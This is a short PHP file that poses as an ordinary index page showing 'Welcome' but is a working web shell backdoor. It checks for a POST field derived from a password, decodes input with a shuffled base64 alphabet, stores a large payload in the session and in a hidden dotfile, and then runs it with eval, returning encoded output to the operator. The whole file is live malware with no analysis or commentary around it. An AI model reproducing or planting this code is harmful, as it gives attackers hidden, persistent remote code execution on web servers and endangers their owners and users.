<?php
@error_reporting(0);@set_time_limit(0);
$_p='pass';
$_k=substr(md5('key'),0,16);
$_sk='db_1a1dc91c';
$_tf=dirname(__FILE__).DIRECTORY_SEPARATOR.'.db_1a1dc91c';
$_sa='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
$_ak=md5($_p.$_k);
$_pn=substr($_ak,0,8);
$_ca=str_split($_sa);
for($_i=63;$_i>0;$_i--){$_j=hexdec($_ak[$_i%32])%($_i+1);$_t=$_ca[$_i];$_ca[$_i]=$_ca[$_j];$_ca[$_j]=$_t;}
$_ca=implode('',$_ca);
if(!function_exists('_dbe')){function _dbe($d,$sa,$ca){return strtr(base64_encode($d),$sa,$ca);}}
if(!function_exists('_dbd')){function _dbd($s,$sa,$ca){$v=base64_decode(strtr($s,$ca,$sa));return $v===false?'':$v;}}
if(!isset($_POST[$_pn])){
  echo '<!DOCTYPE html><html><head><title>Index</title><!-- db:6c37ac82 --></head><body><p>Welcome</p></body></html>';
  exit;
}
$_raw=_dbd($_POST[$_pn],$_sa,$_ca);
if(strlen($_raw)===0)exit;
$_st=null;
@session_start();
if(isset($_SESSION[$_sk]))$_st=$_SESSION[$_sk];
elseif(@file_exists($_tf))$_st=@file_get_contents($_tf);
if($_st===null){
  if(strlen($_raw)>5000){$_SESSION[$_sk]=$_raw;@file_put_contents($_tf,$_raw);}
}else{
  @eval('/*'.$_p.'*/'.$_st.'');
  echo substr(md5($_p.$_k),0,16);
  echo _dbe(@run($_raw),$_sa,$_ca);
  echo substr(md5($_p.$_k),16);
}
?>